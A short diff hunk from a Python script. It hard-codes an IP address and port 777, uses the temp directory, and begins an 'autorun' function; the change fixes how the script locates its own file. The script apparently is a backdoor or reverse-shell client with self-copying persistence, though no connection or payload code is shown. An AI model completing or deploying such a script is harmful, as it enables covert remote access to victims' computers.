@@ -7,7 +7,7 @@ ip = '192.168.1.104'
 port = 777
 path = tempfile.gettempdir()
 filename = os.path.basename(__file__)
-source = os.path.dirname(filename)
+source = os.path.realpath(__file__)
 
 def autorun():
 	if path == source:
